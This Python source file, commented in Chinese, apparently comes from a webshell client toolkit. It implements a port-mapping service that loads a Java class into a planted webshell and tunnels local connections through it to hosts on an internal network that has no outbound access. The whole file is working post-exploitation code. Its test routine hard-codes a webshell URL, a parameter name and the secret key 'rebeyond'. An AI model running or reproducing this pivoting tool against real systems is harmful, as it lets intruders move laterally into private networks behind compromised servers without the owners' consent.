#!/usr/bin/env python3
"""
端口映射服务
实现本地端口到内网目标的映射功能，比SOCKS5更简单直接

工作原理：
1. 用户指定要映射的内网目标（IP:端口）
2. 在本地监听指定端口
3. 当有连接时，建立到webshell的HTTP隧道
4. webshell连接内网目标，进行数据双向转发

使用场景：
- 内网不出网的环境
- 需要访问特定内网服务
- 比SOCKS5代理更直接，无需协议解析
"""

import socket
import threading
import time
from javaShell import JavaShell
from javaPayload import javaPayload


class PortMappingService:
    """端口映射服务"""
    
    def __init__(self, shell: JavaShell):
        self.shell = shell
        self.port_mapping_class_name = None
        self.active_mappings = {}  # {local_port: mapping_info}
        self.active_connections = {}  # {connection_id: connection_info}
        self.is_running = False
        
    def initialize_port_mapping_class(self):
        """初始化端口映射类到webshell"""
        try:
            print("[DEBUG] 正在加载PortMapping类到webshell...")
            
            # 获取PortMapping类的字节码
            payload = javaPayload()
            classInfo = payload.getPayload(
                class_name="PortMapping", 
                obfuscation_method='none'
            )
            
            # 加载类到webshell
            if self.shell.include(classInfo):
                self.port_mapping_class_name = classInfo["classname"]
                print(f"✓ 加载{self.port_mapping_class_name}类成功")
                return True
            else:
                print("✗ 加载PortMapping类失败")
                return False
                
        except Exception as e:
            print(f"[ERROR] 初始化端口映射类失败: {e}")
            return False
    
    def create_mapping(self, local_port, target_ip, target_port, mapping_name=None):
        """
        创建端口映射
        :param local_port: 本地监听端口
        :param target_ip: 内网目标IP
        :param target_port: 内网目标端口
        :param mapping_name: 映射名称（可选）
        :return: 创建结果
        """
        try:
            if not self.port_mapping_class_name:
                if not self.initialize_port_mapping_class():
                    return False
            
            # 检查端口是否已被使用
            if local_port in self.active_mappings:
                print(f"[ERROR] 本地端口 {local_port} 已被映射使用")
                return False
            
            # 生成映射ID
            mapping_id = mapping_name or f"mapping_{local_port}_{int(time.time())}"
            
            print(f"[INFO] 创建端口映射: {local_port} -> {target_ip}:{target_port}")
            
            # 启动本地端口监听
            try:
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind(('127.0.0.1', local_port))
                server_socket.listen(10)
                
                print(f"✓ 本地端口 {local_port} 监听成功")
                
                # 保存映射信息
                mapping_info = {
                    'mapping_id': mapping_id,
                    'local_port': local_port,
                    'target_ip': target_ip,
                    'target_port': target_port,
                    'server_socket': server_socket,
                    'is_active': True,
                    'created_time': time.time(),
                    'connection_count': 0
                }
                
                self.active_mappings[local_port] = mapping_info
                
                # 启动监听线程
                listen_thread = threading.Thread(
                    target=self._handle_mapping_connections,
                    args=(mapping_info,),
                    daemon=True
                )
                listen_thread.start()
                
                print(f"✓ 端口映射创建成功: {local_port} -> {target_ip}:{target_port}")
                return True
                
            except Exception as e:
                print(f"[ERROR] 启动本地端口监听失败: {e}")
                return False
                
        except Exception as e:
            print(f"[ERROR] 创建端口映射异常: {e}")
            return False
    
    def _handle_mapping_connections(self, mapping_info):
        """处理映射连接"""
        mapping_id = mapping_info['mapping_id']
        local_port = mapping_info['local_port']
        target_ip = mapping_info['target_ip']
        target_port = mapping_info['target_port']
        server_socket = mapping_info['server_socket']
        
        print(f"[INFO] 开始监听端口映射连接: {local_port}")
        
        try:
            while mapping_info['is_active']:
                try:
                    # 接受客户端连接
                    client_socket, client_addr = server_socket.accept()
                    mapping_info['connection_count'] += 1
                    
                    connection_id = f"{mapping_id}_{mapping_info['connection_count']}_{int(time.time())}"
                    
                    print(f"[INFO] 新连接到端口映射 {local_port}: {client_addr} -> {connection_id}")
                    
                    # 启动连接处理线程
                    conn_thread = threading.Thread(
                        target=self._handle_single_connection,
                        args=(client_socket, connection_id, mapping_info),
                        daemon=True
                    )
                    conn_thread.start()
                    
                except socket.error as e:
                    if mapping_info['is_active']:
                        print(f"[ERROR] 接受连接异常: {e}")
                    break
                except Exception as e:
                    print(f"[ERROR] 连接处理异常: {e}")
                    time.sleep(1)
                    
        except Exception as e:
            print(f"[ERROR] 映射监听异常: {e}")
        finally:
            print(f"[INFO] 端口映射监听结束: {local_port}")
    
    def _handle_single_connection(self, client_socket, connection_id, mapping_info):
        """处理单个连接（支持隧道复用）"""
        target_ip = mapping_info['target_ip']
        target_port = mapping_info['target_port']
        local_port = mapping_info['local_port']
        
        try:
            print(f"[DEBUG] 处理连接: {connection_id}")
            
            # 检查是否有可复用的webshell隧道
            reusable_connection = self._find_reusable_tunnel(local_port, target_ip, target_port)
            
            if reusable_connection:
                webshell_tunnel_id = reusable_connection['connection_id']
                print(f"[INFO] 复用现有webshell隧道: {webshell_tunnel_id} (新客户端: {connection_id})")
                
                # 保存原始的webshell隧道ID
                original_webshell_tunnel_id = reusable_connection['connection_id']
                
                # 更新连接信息以使用新的客户端socket
                reusable_connection['client_socket'] = client_socket
                reusable_connection['is_active'] = True
                reusable_connection['client_disconnected'] = False
                reusable_connection['should_cleanup'] = True
                reusable_connection['current_client_id'] = connection_id  # 记录当前客户端ID
                reusable_connection['webshell_tunnel_id'] = original_webshell_tunnel_id  # 保存webshell隧道ID
                reusable_connection['connection_id'] = connection_id  # 更新为新的客户端ID
                
                # 从旧的连接映射中删除
                if original_webshell_tunnel_id in self.active_connections:
                    del self.active_connections[original_webshell_tunnel_id]
                
                # 使用新的客户端ID作为键
                self.active_connections[connection_id] = reusable_connection
                
                print(f"[INFO] 隧道复用成功，webshell隧道ID: {webshell_tunnel_id}, 客户端ID: {connection_id}")
                
                # 启动双向数据转发
                self._start_data_forwarding(reusable_connection)
                
            else:
                print(f"[DEBUG] 创建新的webshell端隧道: {connection_id}")
                
                # 在webshell端创建到目标的映射
                success = self.shell.create_port_mapping(
                    connection_id, 
                    target_ip, 
                    str(target_port),
                    self.port_mapping_class_name
                )
                
                if not success:
                    print(f"[ERROR] 创建webshell端映射失败: {connection_id}")
                    client_socket.close()
                    return
                
                # 保存连接信息
                connection_info = {
                    'connection_id': connection_id,
                    'webshell_tunnel_id': connection_id,  # 新隧道，webshell隧道ID与连接ID相同
                    'client_socket': client_socket,
                    'mapping_info': mapping_info,
                    'is_active': True,
                    'created_time': time.time(),
                    'should_cleanup': True
                }
                self.active_connections[connection_id] = connection_info
                
                # 启动双向数据转发
                self._start_data_forwarding(connection_info)
            
        except Exception as e:
            print(f"[ERROR] 处理连接异常: {e}")
            try:
                client_socket.close()
            except:
                pass
    
    def _find_reusable_tunnel(self, local_port, target_ip, target_port):
        """查找可复用的webshell隧道"""
        try:
            for conn_id, conn_info in self.active_connections.items():
                # 检查是否是同一个映射的断开连接
                if (conn_info.get('client_disconnected', False) and 
                    not conn_info.get('is_active', True) and
                    conn_info['mapping_info']['local_port'] == local_port and
                    conn_info['mapping_info']['target_ip'] == target_ip and
                    conn_info['mapping_info']['target_port'] == target_port):
                    
                    # 检查断开时间，如果太久就不复用了（避免僵尸连接）
                    disconnect_time = conn_info.get('client_disconnect_time', 0)
                    if time.time() - disconnect_time < 300:  # 5分钟内可复用
                        print(f"[DEBUG] 找到可复用隧道: {conn_id} (断开时间: {time.time() - disconnect_time:.1f}s)")
                        return conn_info
                    else:
                        print(f"[DEBUG] 隧道过期，清理: {conn_id} (断开时间: {time.time() - disconnect_time:.1f}s)")
                        # 清理过期的隧道
                        try:
                            self.shell.close_port_mapping(conn_id, self.port_mapping_class_name)
                        except:
                            pass
                        del self.active_connections[conn_id]
            
            return None
            
        except Exception as e:
            print(f"[ERROR] 查找可复用隧道异常: {e}")
            return None
    
    def _start_data_forwarding(self, connection_info):
        """启动双向数据转发"""
        connection_id = connection_info['connection_id']
        client_socket = connection_info['client_socket']
        
        try:
            print(f"[DEBUG] 启动数据转发: {connection_id}")
            
            # 启动两个线程：客户端->目标，目标->客户端
            forward_thread = threading.Thread(
                target=self._forward_client_to_target,
                args=(connection_info,),
                daemon=True
            )
            backward_thread = threading.Thread(
                target=self._forward_target_to_client,
                args=(connection_info,),
                daemon=True
            )
            
            forward_thread.start()
            backward_thread.start()
            
            # 等待客户端转发线程结束
            forward_thread.join()
            
            # 根据清理标志决定是否等待目标转发线程
            should_cleanup = connection_info.get('should_cleanup', True)
            if should_cleanup:
                print(f"[DEBUG] 等待目标转发线程结束: {connection_id}")
                backward_thread.join()
            else:
                print(f"[DEBUG] 客户端断开，目标转发线程继续运行: {connection_id}")
                # 不等待backward_thread，让它继续轮询以支持隧道复用
            
        except Exception as e:
            print(f"[ERROR] 数据转发异常: {e}")
        finally:
            # 总是需要清理，只是清理程度不同
            self._cleanup_connection(connection_info)
    
    def _forward_client_to_target(self, connection_info):
        """转发客户端数据到目标"""
        connection_id = connection_info['connection_id']
        client_socket = connection_info['client_socket']
        # 获取webshell端的隧道ID（用于复用场景）
        webshell_tunnel_id = connection_info.get('webshell_tunnel_id', connection_id)
        
        client_disconnected = False
        webshell_error = False
        
        try:
            while connection_info['is_active']:
                try:
                    # 从客户端读取数据
                    data = client_socket.recv(4096)
                    if not data:
                        print(f"[INFO] 客户端正常关闭连接: {connection_id}")
                        client_disconnected = True
                        break
                    
                    # 转发到webshell端的目标（使用webshell隧道ID）
                    success = self.shell.forward_to_mapping(
                        webshell_tunnel_id,
                        data,
                        self.port_mapping_class_name
                    )
                    
                    if not success:
                        print(f"[WARNING] webshell端转发失败，可能隧道已关闭: {connection_id} -> webshell:{webshell_tunnel_id}")
                        webshell_error = True
                        break
                        
                except socket.error as se:
                    print(f"[INFO] 客户端socket断开: {connection_id} - {se}")
                    client_disconnected = True
                    break
                except Exception as e:
                    error_msg = str(e).lower()
                    if ("connection closed" in error_msg or 
                        "connection not found" in error_msg or
                        "mapping not found" in error_msg):
                        print(f"[INFO] webshell端隧道错误: {e}")
                        webshell_error = True
                    else:
                        print(f"[ERROR] 转发到目标异常: {e}")
                        client_disconnected = True  # 默认认为是客户端问题
                    break
                    
        except Exception as e:
            print(f"[ERROR] 客户端转发异常: {e}")
            client_disconnected = True
        finally:
            connection_info['is_active'] = False
            
            # 设置清理标志
            if webshell_error:
                connection_info['should_cleanup'] = True
                print(f"[INFO] 客户端转发检测到webshell错误，将清理隧道: {connection_id}")
            elif client_disconnected:
                connection_info['should_cleanup'] = False
                print(f"[INFO] 客户端断开，保持webshell隧道: {connection_id}")
            else:
                connection_info['should_cleanup'] = True
                print(f"[INFO] 客户端转发正常结束: {connection_id}")
    
    def _forward_target_to_client(self, connection_info):
        """转发目标数据到客户端 - 使用自适应轮询（支持隧道持久化）"""
        connection_id = connection_info['connection_id']
        client_socket = connection_info['client_socket']
        # 获取webshell端的隧道ID（用于复用场景）
        webshell_tunnel_id = connection_info.get('webshell_tunnel_id', connection_id)
        
        # 自适应轮询参数
        min_interval = 0.001  # 高频模式：1ms
        max_interval = 0.1    # 低频模式：100ms
        current_interval = min_interval
        adjustment_factor = 1.5  # 调整倍数
        
        # 数据流量统计
        no_data_count = 0  # 连续无数据次数
        data_received_recently = False  # 最近是否收到数据
        
        # 连接状态标志
        webshell_tunnel_closed = False  # webshell端隧道是否关闭
        client_disconnected = False     # 客户端是否断开
        
        try:
            print(f"[DEBUG] 启动自适应轮询转发: {connection_id}")
            
            # 修改循环条件：只有webshell隧道关闭才退出，客户端断开不影响轮询
            while not webshell_tunnel_closed:
                try:
                    # 从webshell端的目标读取数据（使用webshell隧道ID）
                    data = self.shell.read_from_mapping(
                        webshell_tunnel_id,
                        self.port_mapping_class_name
                    )
                    
                    if data is None:
                        # webshell端连接关闭，需要清理隧道
                        print(f"[INFO] webshell端隧道关闭: {connection_id}")
                        webshell_tunnel_closed = True
                        break
                    elif len(data) == 0:
                        # 没有数据，调整为低频模式
                        no_data_count += 1
                        data_received_recently = False
                        
                        # 逐步降低轮询频率
                        if no_data_count > 10:  # 连续10次无数据后开始降频
                            current_interval = min(current_interval * adjustment_factor, max_interval)
                        
                        # 根据当前频率等待
                        time.sleep(current_interval)
                        continue
                    else:
                        # 收到数据，尝试发送给客户端
                        no_data_count = 0
                        data_received_recently = True
                        current_interval = min_interval  # 重置为高频模式
                        
                        # 检查客户端状态，只有连接正常时才发送数据
                        if not client_disconnected and connection_info.get('is_active', True):
                            try:
                                client_socket.send(data)
                                print(f"[DEBUG] 转发数据: {connection_id} -> 客户端, {len(data)} bytes")
                            except socket.error as se:
                                print(f"[INFO] 客户端断开，进入隧道保持模式: {connection_id} - {se}")
                                client_disconnected = True
                                connection_info['is_active'] = False
                                # 继续轮询，等待新客户端连接复用
                        else:
                            # 客户端已断开，数据暂存（或丢弃），继续轮询
                            if not client_disconnected:
                                print(f"[INFO] 客户端已断开，数据暂存: {connection_id}, {len(data)} bytes")
                                client_disconnected = True
                        
                        # 高频模式下短暂等待
                        time.sleep(current_interval)
                    
                except socket.error as se:
                    print(f"[WARNING] 客户端socket错误，保持webshell隧道: {connection_id} - {se}")
                    client_disconnected = True
                    # 客户端问题不影响webshell端隧道，继续轮询
                    time.sleep(current_interval)
                    continue
                    
                except Exception as e:
                    error_msg = str(e).lower()
                    if ("connection closed" in error_msg or 
                        "connection not found" in error_msg or
                        "mapping not found" in error_msg):
                        print(f"[INFO] webshell端隧道关闭（异常检测）: {connection_id}")
                        webshell_tunnel_closed = True
                        break
                    else:
                        print(f"[ERROR] 读取数据异常: {e}")
                        # 发生异常时使用中等频率重试
                        current_interval = min(max_interval, current_interval * 2)
                        time.sleep(current_interval)
                        
        except Exception as e:
            print(f"[ERROR] 自适应轮询转发异常: {e}")
        finally:
            # 循环退出说明webshell隧道已关闭，需要清理
            print(f"[INFO] webshell端隧道已关闭，结束自适应轮询: {connection_id}")
            connection_info['is_active'] = False
            connection_info['should_cleanup'] = True
            
            print(f"[DEBUG] 自适应轮询转发结束: {connection_id}")
    
    def _cleanup_connection(self, connection_info):
        """清理连接资源（支持隧道持久化）"""
        connection_id = connection_info['connection_id']
        client_socket = connection_info['client_socket']
        should_cleanup = connection_info.get('should_cleanup', True)
        
        try:
            if should_cleanup:
                print(f"[DEBUG] 完全清理连接: {connection_id}")
            else:
                print(f"[DEBUG] 仅清理客户端连接，保持webshell隧道: {connection_id}")
            
            # 关闭客户端socket
            try:
                client_socket.close()
            except:
                pass
            
            # 根据标志决定是否关闭webshell端的映射
            if should_cleanup:
                webshell_tunnel_id = connection_info.get('webshell_tunnel_id', connection_id)
                try:
                    self.shell.close_port_mapping(
                        webshell_tunnel_id,
                        self.port_mapping_class_name
                    )
                    print(f"[DEBUG] 已关闭webshell端隧道: {webshell_tunnel_id} (客户端: {connection_id})")
                except Exception as e:
                    print(f"[WARNING] 关闭webshell端隧道失败: {e}")
            else:
                webshell_tunnel_id = connection_info.get('webshell_tunnel_id', connection_id)
                print(f"[INFO] 保持webshell端隧道活跃: {webshell_tunnel_id} (客户端断开: {connection_id})")
                # 将连接信息标记为"仅客户端断开"，但不删除
                connection_info['client_disconnected'] = True
                connection_info['client_disconnect_time'] = time.time()
                connection_info['is_active'] = False  # 确保标记为非活跃
                return  # 不从active_connections中删除，允许后续复用
            
            # 从活跃连接中移除
            if connection_id in self.active_connections:
                del self.active_connections[connection_id]
                
        except Exception as e:
            print(f"[ERROR] 清理连接异常: {e}")
    
    def close_mapping(self, local_port):
        """关闭指定的端口映射"""
        try:
            if local_port not in self.active_mappings:
                print(f"[WARNING] 端口映射不存在: {local_port}")
                return False
            
            mapping_info = self.active_mappings[local_port]
            
            print(f"[INFO] 关闭端口映射: {local_port}")
            
            # 标记为非活跃
            mapping_info['is_active'] = False
            
            # 关闭服务器socket
            try:
                mapping_info['server_socket'].close()
            except:
                pass
            
            # 清理所有相关连接
            connections_to_close = [
                conn_id for conn_id, conn_info in self.active_connections.items()
                if conn_info['mapping_info']['local_port'] == local_port
            ]
            
            for conn_id in connections_to_close:
                if conn_id in self.active_connections:
                    self._cleanup_connection(self.active_connections[conn_id])
            
            # 从活跃映射中移除
            del self.active_mappings[local_port]
            
            print(f"✓ 端口映射关闭成功: {local_port}")
            return True
            
        except Exception as e:
            print(f"[ERROR] 关闭端口映射异常: {e}")
            return False
    
    def get_mapping_status(self):
        """获取映射状态（已优化：无需webshell端状态查询）"""
        try:
            status = {
                'active_mappings': len(self.active_mappings),
                'active_connections': len(self.active_connections),
                'mappings': [],
                'optimization': '使用自适应轮询，通过readData检测连接状态'
            }
            
            for local_port, mapping_info in self.active_mappings.items():
                # 统计该映射的活跃连接数
                active_connections_for_mapping = sum(
                    1 for conn_info in self.active_connections.values()
                    if conn_info['mapping_info']['local_port'] == local_port and conn_info['is_active']
                )
                
                mapping_status = {
                    'local_port': local_port,
                    'target': f"{mapping_info['target_ip']}:{mapping_info['target_port']}",
                    'mapping_id': mapping_info['mapping_id'],
                    'total_connections': mapping_info['connection_count'],
                    'active_connections': active_connections_for_mapping,
                    'is_active': mapping_info['is_active'],
                    'uptime': time.time() - mapping_info['created_time']
                }
                status['mappings'].append(mapping_status)
            
            return status
            
        except Exception as e:
            print(f"[ERROR] 获取映射状态异常: {e}")
            return {'error': str(e)}
    
    def close_all_mappings(self):
        """关闭所有端口映射"""
        try:
            print("[INFO] 关闭所有端口映射...")
            
            local_ports = list(self.active_mappings.keys())
            for local_port in local_ports:
                self.close_mapping(local_port)
            
            # 清理webshell端所有映射
            if self.port_mapping_class_name:
                self.shell.clear_all_port_mappings(self.port_mapping_class_name)
            
            print("✓ 所有端口映射已关闭")
            return True
            
        except Exception as e:
            print(f"[ERROR] 关闭所有映射异常: {e}")
            return False


# 使用示例和测试代码
def test_port_mapping():
    """测试端口映射功能"""
    try:
        print("=" * 70)
        print("🔧 测试端口映射功能")
        print("=" * 70)
        
        # webshell连接配置
        WEBSHELL_CONFIG = {
            "url": "http://172.26.36.30:8080/webshell/linux_webshell.jsp",
            "param_name": "pass",
            "secret_key": "rebeyond"
        }
        
        print("🔗 正在连接webshell...")
        
        # 初始化webshell连接
        shell = JavaShell(
            url=WEBSHELL_CONFIG["url"],
            param_name=WEBSHELL_CONFIG["param_name"], 
            secret_key=WEBSHELL_CONFIG["secret_key"]
        )
        
        # 初始化payload
        shell.init_payload()
        
        # 测试webshell连接
        if not shell.test():
            print("❌ Webshell连接测试失败！")
            return False
        
        print("✅ Webshell连接测试成功!")
        
        # 创建端口映射服务
        print("🔧 正在初始化端口映射服务...")
        port_service = PortMappingService(shell)
        
        # 创建端口映射：本地8080 -> 内网172.26.32.1:7000
        print("🌐 创建端口映射: 8080 -> 172.26.32.1:7000")
        if not port_service.create_mapping(2222, "172.26.32.1", 7000):
            print("❌ 创建端口映射失败！")
            return False
        
        print("✅ 端口映射创建成功!")
        
        # 显示状态信息
        print("\n" + "=" * 70)
        print("📊 端口映射状态（已优化）")
        print("=" * 70)
        status = port_service.get_mapping_status()
        print(f"活跃映射数: {status['active_mappings']}")
        print(f"活跃连接数: {status['active_connections']}")
        print(f"优化特性: {status.get('optimization', '未知')}")
        
        for mapping in status['mappings']:
            print(f"映射: {mapping['local_port']} -> {mapping['target']}")
            print(f"  ID: {mapping['mapping_id']}")
            print(f"  总连接数: {mapping['total_connections']}")
            print(f"  活跃连接: {mapping['active_connections']}")
            print(f"  运行时间: {mapping['uptime']:.1f}s")
        
        print("\n💡 使用说明:")
        print("1. 端口映射已建立: 127.0.0.1:2222 -> 172.26.32.1:7000")
        print("2. 现在可以直接访问 http://127.0.0.1:2222")
        print("3. 自适应轮询：有数据时高频(1ms)，无数据时低频(100ms)")
        print("4. 通过readData自动检测连接状态，无需额外查询")
        print("5. 按Ctrl+C停止服务")
        
        # 保持服务运行
        try:
            while True:
                time.sleep(5)
                # 定期显示状态
                status = port_service.get_mapping_status()
                active_mappings = status['active_mappings']
                active_connections = status['active_connections']
                print(f"[{time.strftime('%H:%M:%S')}] 映射: {active_mappings}, 活跃连接: {active_connections}")
        except KeyboardInterrupt:
            print("\n[INFO] 收到停止信号")
        
        return True
        
    except Exception as e:
        print(f"❌ 测试异常: {e}")
        import traceback
        traceback.print_exc()
        return False
    finally:
        # 清理资源
        try:
            port_service.close_all_mappings()
        except:
            pass
        print("\n👋 测试结束")


def main():
    """主函数"""
    print("端口映射服务")
    print("简化版的点对点隧道，无需SOCKS5协议")
    
    # 询问是否运行测试
    try:
        choice = input("\n是否运行测试? (y/N): ").strip().lower()
        if choice == 'y':
            test_port_mapping()
    except KeyboardInterrupt:
        print("\n[INFO] 已取消")


if __name__ == "__main__":
    main()
